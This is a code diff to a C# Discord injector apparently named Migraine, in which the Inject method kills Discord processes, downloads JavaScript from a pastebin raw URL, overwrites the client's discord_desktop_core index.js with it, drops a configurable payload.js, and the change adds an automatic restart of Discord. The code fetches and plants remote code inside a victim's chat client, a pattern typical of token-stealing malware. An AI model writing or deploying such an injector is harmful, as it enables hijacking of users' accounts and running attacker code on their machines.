@@ -22,21 +22,27 @@ namespace Migraine_v2.DClient
                 Inject();
             }
         }
-        public bool Inject()
+        public bool Inject(bool Restart = true)
         {
             try 
             {
-                var Process = GetDiscordProcesses();
-                var DriveLetter = GetDriveInfo(new FileInfo(GetProcessPath(Process[0].Id)));
+                var _Process = GetDiscordProcesses();
+                var DriveLetter = GetDriveInfo(new FileInfo(GetProcessPath(_Process[0].Id)));
                 var CanaryVersion = "0.0.263";
                 var DiscordVersion = "0.0.306";
-                var path = Process.First().ProcessName.Contains("Canary") ? $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Roaming\\\\discordcanary\\{CanaryVersion}\\modules\\discord_desktop_core" : $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Roaming\\\\Discord\\{DiscordVersion}\\modules\\discord_desktop_core";
-                if (Settings.KillDiscord) Process.ForEach(x => x.Kill());
-                var InjectionCode = new WebClient().DownloadString("https://pastebin.com/raw/6SghAyRq");
-                InjectionCode = InjectionCode.Replace("directoryofinjection", $"{path}\\Migraine");
+                var path = _Process.First().ProcessName.Contains("Canary") ? $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Roaming\\\\discordcanary\\{CanaryVersion}\\modules\\discord_desktop_core" : $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Roaming\\\\Discord\\{DiscordVersion}\\modules\\discord_desktop_core";
+                if (Settings.KillDiscord) _Process.ForEach(x => x.Kill());
+                var InjectionCode = new WebClient().DownloadString("https://pastebin.com/raw/BcNtAqtQ");
+                var Branch = _Process.First().ProcessName.Contains("Canary") ? "discordcanary" : "Discord";
+                var BranchVersion = Branch == "discordcanary" ? CanaryVersion : DiscordVersion;
+                var DiscordPath = $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Local\\Discord\\app-{DiscordVersion}\\Discord.exe";
+                var DiscordCanaryPath = $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Local\\DiscordCanary\\app-{CanaryVersion}\\DiscordCanary.exe";
+                var FixedDirectoryOfInjection = DriveLetter + @"\Users\\" + Environment.UserName + @"\\AppData\\Roaming\\\\" + Branch + @"\\" + BranchVersion + @"\\modules\\discord_desktop_core";
+                InjectionCode = InjectionCode.Replace("directoryofinjection", FixedDirectoryOfInjection + @"\\Migraine");
                 Directory.CreateDirectory($"{path}\\Migraine");
                 File.WriteAllText($"{path}\\index.js", InjectionCode);
                 File.WriteAllText($"{path}\\Migraine\\payload.js", Settings.Payload);
+                if (Restart) Process.Start(Branch == "discordcanary" ? DiscordCanaryPath : DiscordPath);
                 return true;
             }
             catch(Exception)
